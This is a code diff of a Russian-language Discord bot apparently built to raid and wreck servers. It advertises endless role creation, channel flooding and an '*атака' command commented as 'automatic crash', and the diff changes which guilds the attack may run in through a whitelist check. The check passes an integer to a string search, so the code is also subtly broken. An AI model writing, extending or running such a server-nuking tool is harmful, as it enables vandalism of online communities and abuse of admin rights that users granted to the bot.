@@ -8,13 +8,16 @@ print('Ожидание входа...')
 class MyClient(discord.Client):
 	async def on_ready(self):
 		print('Вошёл как', self.user)
-		await client.change_presence(activity = discord.Game('Крутой бот | v2.4'))
+		await client.change_presence(activity = discord.Game('Крутой бот | v2.5'))
 		
 	async def on_message(self, message):
 		c = 0
 		r = 0
 		m = 0
 		s = 0
+		white = open('whitelist.txt', 'r').read()
+		black = open('blacklist.txt', 'r').read()
+		vips = open('vip.txt', 'r').read()
 		print('{0.author} с сервера {0.guild.name} и канала {0.channel.name} сказал: {0.content}'.format(message))
 		if message.content == '*помощь': #помощь
 			await message.delete()
@@ -32,7 +35,7 @@ class MyClient(discord.Client):
 			embed.add_field(name='*роли+', value='Бесконечное создание ролей', inline=False)
 			embed.add_field(name='*флуд', value='Зафлудить текущий канал', inline=False)
 			await message.author.send(embed=embed)
-		if message.guild.id != 732584678313427008 and message.guild.id != 725752675106291804 and message.guild.id != 741589705094594642 and message.guild.id != 561460998444154881 and message.guild.id != 724533962583834665 and message.guild.id != 707402752166199378:
+		if white.find(message.guild.id) != -1:
 			if message.content == '*атака': #автоматический краш
 				await message.delete() #удаление сообщения
 				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
